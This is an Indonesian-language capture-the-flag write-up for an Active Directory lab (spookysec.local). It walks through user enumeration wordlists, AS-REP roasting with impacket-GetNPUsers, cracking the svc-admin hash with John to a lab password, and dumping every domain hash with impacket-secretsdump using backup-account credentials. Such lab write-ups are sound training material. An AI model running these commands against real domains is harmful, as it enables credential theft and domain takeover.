TASK 04

Enumerating Users via Kerbrute

▼

Download Wordlist

BASH
wget https://raw.githubusercontent.com/Sq00ky/attacktive-directory-tools/master/userlist.txt
wget https://raw.githubusercontent.com/Sq00ky/attacktive-directory-tools/master/passwordlist.txt

BASH

TASK 05

Abusing Kerberos — ASREPRoasting

▼

Ambil Kerberos Ticket

ASREPRoasting menyerang akun yang tidak memerlukan Kerberos pre-authentication. Kita gunakan GetNPUsers dari Impacket.

BASH
impacket-GetNPUsers spookysec.local/ -usersfile userlist.txt -no-pass -dc-ip 10.48.186.111
terminal — GetNPUsers scanning users

Hash berhasil didapat dari akun svc-admin:

HASH
[email protected]:b2bf19c28264b4dc8e22cecd8f176551$86adc3eee89a...
terminal — hash AS-REP ditemukan

Crack Hash dengan John

BASH
john --wordlist=passwordlist.txt hash.txt
terminal — john berhasil crack password
🎉
Password berhasil di-crack: management2005
PERTANYAANJAWABAN

TASK 07

Elevating Privileges — secretsdump

▼

Dump Semua Password Hash

Akun backup memiliki privilege untuk sync semua perubahan AD termasuk password hash. Kita eksploitasi ini dengan secretsdump.

BASH
impacket-secretsdump -just-dc backup:backup2517860@10.48.186.111

Hash Administrator berhasil didapat:

terminal — secretsdump semua hash domain
OUTPUT
